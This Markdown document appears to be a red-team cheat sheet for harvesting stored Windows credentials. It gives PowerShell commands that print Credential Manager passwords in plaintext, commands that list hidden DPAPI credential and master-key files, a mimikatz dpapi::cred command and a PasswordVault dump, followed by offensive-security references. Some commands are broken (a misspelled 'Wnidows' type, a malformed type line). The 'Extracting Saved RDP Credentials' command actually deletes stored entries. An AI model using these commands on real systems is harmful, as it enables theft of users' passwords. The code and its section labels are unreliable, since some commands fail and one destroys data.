# Living off the Land

## 01 - Types of credentials to dump

Various credentials will be harvested and they are:
- Web browsers
- Emails
- Video Conferences
- Wi-Fi credentials
- Certificates
- RDP passwords
- etc

## 01 - View Credentials

### 1.1 - PowerShell

```powershell
PS C:\> $credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq
'Generic' } | Select-Object -Property UserName, Password
```

```
PS C:\> Get-StoredCredential | ForEach-Object { Write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }
```

## 02 - List Credential Files

### 2.1 - Command Prompt

TODO: Fill this info

```
C:\> dir /a:h C:\Users\%username%\AppData\Local\Microsoft\Credentials

C:\> dir /a:h C:\Users\%username%\AppData\Roaming\Microsoft\Credentials

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

```
C:\> dir C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SUID>\<GUID>
```

```
mimikatz # dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\ /master-key:
```

### 2.2 - PowerShell

```powershell
[void][Windows.Security.Credentials.PasswordVault.Windows.Security.Credentials.ContentType=WindowsRuntime]
$vault = New-Object Wnidows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
```

## 03 - Extracting Saved RDP Credentials

### 3.1 - PowerShell

```
PS C:\> cmdkey.exe /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey.exe /delete:($_ -split ' ')[-1] }
```

---
## References

### LOFLCAB

- [LOFLCAB: Get-ChildItem](https://lofl-project.github.io/loflcab/Cmdlets/Get-ChildItem/)

### Hacktricks

- [HackTricks: DPAPI - Extracting Passwords](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)

### InternalAllTheThings

- [InternalAllTheThings: Windows - DPAPI](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi)

### Hacking Articles

- [Hacking Articles: Windows Credential Manager](https://www.hackingarticles.in/credential-dumping-windows-credential-manager/)

### The Hacker Recipes

- [The Hacker Recipes: DPAPI Protected Secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

- [The Hacker Recipes: Cred](https://tools.thehacker.recipes/mimikatz/modules/vault/cred)

- [The Hacker Recipes: Vault](https://tools.thehacker.recipes/mimikatz/modules/vault/list)

### harmj0y

- [harmj0y: Operational Guidance for Offensive User DPAPI Abuse](https://web.archive.org/web/20211206115041/https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)

### Pentestlab

- [Pentestlab Blog: Dumping RDP Credentials](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)

### Passcape

- [Passcape Software: DPAPI Secrets](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28)

### Bartosz Inglot

- [Bartosz Inglot: The Blackbox of DPAPI](https://github.com/msuiche/OPCDE/blob/master/2017/The%20Blackbox%20of%20DPAPI%20the%20gift%20that%20keeps%20on%20giving%20-%20Bartosz%20Inglot/The%20Blackbox%20of%20DPAPI%20-%20Bart%20Inglot.pdf)

### Jean Christophe Delaunay

- [Jean Christophe Delaunay: DPAPI exploitation during pentest and password cracking](https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf)

### Francesco Picasso:

- [Francesco Picasso: Happy DPAPI!](https://blog.digital-forensics.it/2015/01/happy-dpapi.html)

- [Francesco Picasso: ReVaulting! Decryption and opportunities](https://www.slideshare.net/slideshow/revaulting-decryption-and-opportunities/56834244)

### Itai Grady

- [Itai Grady: Protecting browsersâ€™ secrets in a domain environment](https://www.slideshare.net/slideshow/protecting-browsers-secrets-in-adomainenvironment/63364753)

### Jean Michel Picod and Elie Bursztein

- [Jean Michel Picod and Elie Bursztein: Decrypting DPAPI data](https://elie.net/static/files/reversing-dpapi-and-stealing-windows-secrets-offline/reversing-dpapi-and-stealing-windows-secrets-offline-slides.pdf)

### Rasta Mouse

- [Rasta Mouse: Jumping Network Segregation with RDP](https://web.archive.org/web/20200525123919/https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)